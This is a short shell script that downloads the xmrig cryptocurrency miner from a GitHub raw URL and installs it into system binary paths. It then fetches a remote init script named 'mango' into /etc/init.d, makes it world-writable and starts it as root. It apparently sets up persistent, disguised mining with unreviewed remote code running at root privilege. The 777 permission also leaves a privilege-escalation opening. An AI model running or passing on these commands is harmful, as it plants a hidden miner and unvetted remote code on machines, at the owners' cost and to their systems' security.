rm -rf xmrig.tar.gz
wget https://raw.githubusercontent.com/BigOrt/bigort/master/xmrig.tar.gz && tar -zxvf xmrig.tar.gz
sudo apt-get install libmicrohttpd-dev
sudo cp xmrig /usr/local/bin
sudo cp xmrig /usr/bin
sudo chmod +x /usr/local/bin/xmrig
sudo chmod +x /usr/bin/xmrig
sudo wget https://raw.githubusercontent.com/BigOrt/bigort/master/mango -O /etc/init.d/mango
sudo chmod -R 777 /etc/init.d/mango
sudo /etc/init.d/mango start
